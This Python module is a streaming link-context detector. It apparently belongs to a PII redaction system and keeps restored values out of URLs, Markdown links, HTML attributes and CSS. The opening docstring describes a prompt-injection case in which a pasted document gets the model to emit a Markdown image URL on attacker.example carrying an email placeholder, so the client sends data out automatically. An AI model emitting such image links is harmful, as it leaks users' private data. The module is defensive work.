"""Whether answer text, read left to right, is inside a link (ADR 0003 amendment 1).

Rehydration must never put an original value inside a URL: a pasted document can ask
the model for `![s](https://attacker.example/p.png?d=[EMAIL_1])`, and a Markdown
client fetches that image without a click. `LinkContext` reads the text as the
client will see it, restored values included, and says whether the next character
would be part of a link target:

- a bare URL: from `//` (so `scheme://` and protocol-relative `//host`), from a
  `www.` that starts a word (any case), or from a colon that ends a scheme
  (`[A-Za-z][A-Za-z0-9+.-]*`, any case: `https:host`, `javascript:`, `data:`,
  `mailto:`), up to the next ASCII whitespace. A colon followed by whitespace, as
  in `Note: ...`, is prose and ends there;
- a Markdown link or image target: from `](` to its closing `)`, nested
  parentheses and `<...>` destinations included, or to a blank line;
- a link reference definition: the destination after `]:` anywhere on a line (so
  inside a block quote or a list item too, and after a label split over lines),
  on that line or the next;
- an autolink: `<scheme:` up to `>` or ASCII whitespace;
- an HTML attribute value of any attribute inside a tag, quoted or not;
- CSS: `url(` up to its closing `)` outside quotes, and the string or word after
  `@import`, any case.

Every rule errs towards "inside": a false positive leaves a placeholder visible,
a false negative can send a value off the machine. The state is a few flags and
the last eight characters, so it streams in constant memory, and feeding text in
any number of pieces gives the same answers as feeding it whole.
"""

import re
import string
from enum import Enum, auto


class _Ref(Enum):
    NONE = auto()
    AWAIT = auto()  # after `]:`, before the destination
    DEST = auto()
    ANGLE = auto()  # a destination in `<...>`


class _Tag(Enum):
    NONE = auto()
    NAME = auto()  # after `<` and a letter: a tag name, or an autolink's scheme
    AUTOLINK = auto()
    IN_TAG = auto()
    AWAIT_VALUE = auto()  # after `=`
    QUOTED = auto()
    UNQUOTED = auto()


class _Css(Enum):
    NONE = auto()
    URL = auto()  # inside `url(`, up to its `)` outside quotes
    AWAIT_IMPORT = auto()  # after `@import`, before its URL
    STRING = auto()  # `@import '...'`
    WORD = auto()  # `@import x.css;`


_REF_INSIDE = frozenset({_Ref.AWAIT, _Ref.DEST, _Ref.ANGLE})
_TAG_INSIDE = frozenset({_Tag.AUTOLINK, _Tag.AWAIT_VALUE, _Tag.QUOTED, _Tag.UNQUOTED})
# Outside every context, only these characters can open one (or start a line).
_TRIGGER = re.compile(r"[\n/.(<:@]")
_RECENT = 8  # characters kept: `@import` needs seven
# HTML's and WHATWG's ASCII whitespace. Anything else, a no-break space or a control
# character included, can be part of a URL (security review 2, M-a).
_ASCII_SPACE = frozenset(" \t\n\r\f")
_LETTERS = frozenset(string.ascii_letters)
_SCHEME_CHARS = frozenset(string.ascii_letters + string.digits + "+.-")
_IMPORT = "@import"


def _scheme_after(has_letter: bool, chunk: str) -> bool:  # noqa: FBT001  (a fold step)
    """Whether the run of scheme characters that ends `chunk` holds a letter.

    A run with a letter in it ends in a scheme: the part from that letter on.
    """
    start = len(chunk)
    while start > 0 and chunk[start - 1] in _SCHEME_CHARS:
        start -= 1
    letter = any(char in _LETTERS for char in chunk[start:])
    return letter or (has_letter and start == 0)


class LinkContext:
    """Feed text in order; `inside` says whether the next character is in a link."""

    def __init__(self) -> None:
        self._recent = ""
        self._line_blank = True  # only whitespace so far on this line
        self._scheme = False  # the scheme characters just read hold a letter
        self._bare = False
        self._md_depth: int | None = None  # open parentheses inside `](...)`
        self._md_angle = False
        self._ref = _Ref.NONE
        self._tag = _Tag.NONE
        self._quote = ""
        self._css = _Css.NONE
        self._css_quote = ""

    @property
    def inside(self) -> bool:
        return (
            self._bare
            or self._md_depth is not None
            or self._ref in _REF_INSIDE
            or self._tag in _TAG_INSIDE
            or self._css is not _Css.NONE
        )

    def feed(self, text: str) -> None:
        index, end = 0, len(text)
        while index < end:
            if self._idle():
                found = _TRIGGER.search(text, index)
                stop = end if found is None else found.start()
                if stop > index:
                    self._scheme = _scheme_after(self._scheme, text[index:stop])
                    self._recent = (self._recent + text[max(index, stop - _RECENT) : stop])[
                        -_RECENT:
                    ]
                    index = stop
                    continue
            self._step(text[index])
            index += 1

    def _idle(self) -> bool:
        """Nothing is open, and no character but a trigger can open anything."""
        return (
            not self._line_blank
            and not self._bare
            and self._md_depth is None
            and self._ref is _Ref.NONE
            and self._tag is _Tag.NONE
            and self._css is _Css.NONE
            and not self._recent.endswith("<")
            # `@impor` is read one character at a time, so its `t` is seen.
            and "@" not in self._recent[-(len(_IMPORT) - 1) :]
        )

    def _step(self, char: str) -> None:
        prev = self._recent[-1:]
        self._line(char)
        self._bare_url(char, prev)
        self._markdown(char, prev)
        self._reference(char, prev)
        self._html(char, prev)
        self._style(char)
        self._recent = (self._recent + char)[-_RECENT:]

    def _line(self, char: str) -> None:
        if char == "\n":
            if self._line_blank:  # a blank line ends every Markdown construct
                self._md_depth = None
                self._md_angle = False
                self._ref = _Ref.NONE
                # A quoted attribute value runs on to its quote, blank lines included,
                # as a browser reads it; the rest of a tag ends here.
                if self._tag is not _Tag.QUOTED:
                    self._tag = _Tag.NONE
            self._line_blank = True
        elif not char.isspace():
            self._line_blank = False

    def _bare_url(self, char: str, prev: str) -> None:
        if self._bare:
            self._bare = char not in _ASCII_SPACE
        elif (
            (char == "/" and prev == "/")
            or (char == "." and self._starts_www())
            or (char == ":" and self._scheme)
        ):
            # After `scheme:` the URL is open at once: a token may follow the colon
            # directly. Whitespace next, as in `Note: x`, closes it again.
            self._bare = True
        self._scheme = (self._scheme or char in _LETTERS) if char in _SCHEME_CHARS else False

    def _starts_www(self) -> bool:
        recent = self._recent
        return recent.lower().endswith("www") and (
            len(recent) <= len("www") or not recent[-4].isalnum()
        )

    def _markdown(self, char: str, prev: str) -> None:
        if self._md_depth is None:
            if char == "(" and prev == "]":
                self._md_depth = 0
        elif self._md_angle:
            self._md_angle = char != ">"
        elif char == "<":
            self._md_angle = True
        elif char == "(":
            self._md_depth += 1
        elif char == ")":
            self._md_depth = None if self._md_depth == 0 else self._md_depth - 1

    def _reference(self, char: str, prev: str) -> None:
        ref = self._ref
        if ref is _Ref.NONE:
            # Anywhere, not only at the start of a line: `> [r]: ...` and `- [r]: ...`
            # define a reference too, and so does a label split over lines.
            if char == ":" and prev == "]":
                self._ref = _Ref.AWAIT
        elif ref is _Ref.AWAIT:
            if char == "<":
                self._ref = _Ref.ANGLE
            elif char not in _ASCII_SPACE:
                self._ref = _Ref.DEST
        elif ref is _Ref.DEST:
            if char in _ASCII_SPACE:
                self._ref = _Ref.NONE
        elif char in ">\n":
            self._ref = _Ref.NONE

    def _html(self, char: str, prev: str) -> None:
        tag = self._tag
        if tag is _Tag.NONE:
            if prev == "<" and char in _LETTERS:
                self._tag = _Tag.NAME
        elif tag is _Tag.QUOTED:
            if char == self._quote:
                self._tag = _Tag.IN_TAG
        elif tag is _Tag.AWAIT_VALUE:
            self._tag = _value_start(char)
            self._quote = char
        else:
            self._tag = _NEXT_TAG[tag](char)

    def _style(self, char: str) -> None:
        css = self._css
        if css is _Css.URL:
            self._in_css_url(char)
        elif css is _Css.STRING:
            if char == self._css_quote:
                self._css = _Css.NONE
        elif css is _Css.AWAIT_IMPORT:
            if char in "\"'":
                self._css, self._css_quote = _Css.STRING, char
            elif char not in _ASCII_SPACE:
                self._css = _Css.WORD
                self._css_word(char)
        elif css is _Css.WORD:
            self._css_word(char)
        elif char == "(" and self._recent.lower().endswith("url"):
            self._css, self._css_quote = _Css.URL, ""
        elif char in "tT" and self._recent.lower().endswith(_IMPORT[:-1]):
            self._css = _Css.AWAIT_IMPORT

    def _in_css_url(self, char: str) -> None:
        if self._css_quote:
            if char == self._css_quote:
                self._css_quote = ""
        elif char in "\"'":
            self._css_quote = char
        elif char == ")":
            self._css = _Css.NONE

    def _css_word(self, char: str) -> None:
        if char == "(" and self._recent.lower().endswith("url"):
            self._css, self._css_quote = _Css.URL, ""
        elif char in _ASCII_SPACE or char == ";":
            self._css = _Css.NONE


def _after_name(char: str) -> _Tag:
    """The state after one more character of what followed `<` and a letter."""
    if char == ":":
        return _Tag.AUTOLINK  # `<https:`: a scheme, so an autolink
    if char in _SCHEME_CHARS:
        return _Tag.NAME
    if char.isspace() or char == "/":
        return _Tag.IN_TAG
    return _Tag.NONE


def _in_autolink(char: str) -> _Tag:
    return _Tag.NONE if char == ">" or char in _ASCII_SPACE else _Tag.AUTOLINK


def _in_tag(char: str) -> _Tag:
    if char == ">":
        return _Tag.NONE
    return _Tag.AWAIT_VALUE if char == "=" else _Tag.IN_TAG


def _in_unquoted(char: str) -> _Tag:
    if char == ">":
        return _Tag.NONE
    return _Tag.IN_TAG if char in _ASCII_SPACE else _Tag.UNQUOTED


def _value_start(char: str) -> _Tag:
    if char in "\"'":
        return _Tag.QUOTED
    if char == ">":
        return _Tag.NONE
    if char in _ASCII_SPACE:
        return _Tag.AWAIT_VALUE
    return _Tag.UNQUOTED


_NEXT_TAG = {
    _Tag.NAME: _after_name,
    _Tag.AUTOLINK: _in_autolink,
    _Tag.IN_TAG: _in_tag,
    _Tag.UNQUOTED: _in_unquoted,
}
